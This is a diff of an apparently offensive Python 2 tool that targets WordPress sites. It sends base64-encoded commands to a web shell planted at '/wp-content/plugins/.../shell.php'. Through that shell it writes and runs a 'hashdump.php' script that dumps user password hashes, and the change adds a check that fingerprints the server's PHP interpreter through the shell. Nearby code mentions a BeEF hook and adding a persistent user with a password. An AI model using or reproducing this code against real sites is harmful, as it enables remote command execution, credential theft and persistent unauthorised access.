@@ -327,14 +327,14 @@ if ($result->num_rows > 0) {
 $conn->close();
 ?> ''' % (items[0], items[1], items[2], items[3])
     payload = dumper.encode('base64')
-
-    params = [
-    ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > hashdump.php').encode('base64'))]
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    params = [
-    ('cmd', 'php hashdump.php'.encode('base64'))]
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    print sendcommand.text
+    if safety(host, uploaddir):    
+        params = [
+        ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > hashdump.php').encode('base64'))]
+        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+        params = [
+        ('cmd', 'php hashdump.php'.encode('base64'))]
+        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+        print sendcommand.text
 
 
 def beefhook(host,uploaddir):
@@ -370,6 +370,18 @@ if(!username_exists($new_user_email)) {
         print "Added persistent user \"%s\" with the password \"%s\"." % (username, password)
 
 
+def safety(host,uploaddir):
+    params = [('cmd', ('which php').encode('base64'))] #Checks which PHP
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    results = sendcommand.text
+    params = [('cmd', ('readlink -e ' + results).encode('base64'))] # resolves Symlinks
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    if "php-cgi" in sendcommand.text: #issues with php-cgi.  Aborts the module.
+        print "The PHP interpreter on this system is not compatible with this module."
+        return False
+    else:
+        return True        
+        
 
 def printbanner():
     banner = """\
